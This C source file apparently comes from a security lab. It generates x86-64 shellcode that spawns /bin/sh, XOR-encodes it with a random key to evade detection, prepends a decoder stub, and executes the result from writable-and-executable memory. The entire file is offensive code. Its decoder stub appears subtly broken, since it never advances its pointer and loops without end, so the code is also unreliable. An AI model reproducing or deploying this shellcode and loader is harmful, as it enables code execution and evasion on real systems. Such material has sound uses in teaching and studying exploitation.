#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <time.h>
#include "lab_common.h"

unsigned char* generate_polymorphic_shellcode(int *out_len) {
    unsigned char shellcode[] = {
        0x48, 0x31, 0xd2,
        0x48, 0x31, 0xf6,
        0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e,
        0x2f, 0x73, 0x68, 0x00,
        0x53,
        0x48, 0x89, 0xe7,
        0x48, 0x31, 0xc0,
        0xb0, 0x3b,
        0x0f, 0x05
    };
    int base_len = sizeof(shellcode);
    
    unsigned char key = (rand() & 0xFF);
    if (key == 0) key = 0xAB;
    
    for (int i = 0; i < base_len; i++) {
        shellcode[i] ^= key;
    }
    
    unsigned char decoder[] = {
        0xb0, key,                              // mov al, key
        0x48, 0x8d, 0x35, 0x00, 0x00, 0x00, 0x00, // lea rsi, [rip]
        0x80, 0x36, key,                        // xor byte [rsi], key
        0xeb, 0xf8                              // jmp back
    };
    
    int total_len = sizeof(decoder) + base_len;
    unsigned char *result = malloc(total_len);
    memcpy(result, decoder, sizeof(decoder));
    memcpy(result + sizeof(decoder), shellcode, base_len);
    
    *out_len = total_len;
    printf("[+] Polymorphic shellcode (XOR key: 0x%02x, %d bytes)\n", key, total_len);
    return result;
}

int run_polymorphic(void) {
    int len;
    unsigned char *code = generate_polymorphic_shellcode(&len);
    
    void *mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { perror("[-] mmap failed"); return -1; }
    
    memcpy(mem, code, len);
    printf("[+] Polymorphic shellcode at %p (W+X)\n", mem);
    
    void (*func)() = mem;
    func(); // Executes /bin/sh
    
    free(code);
    return 0;
}

int main(void) {
    srand(time(NULL) ^ getpid());
    return run_polymorphic();
}
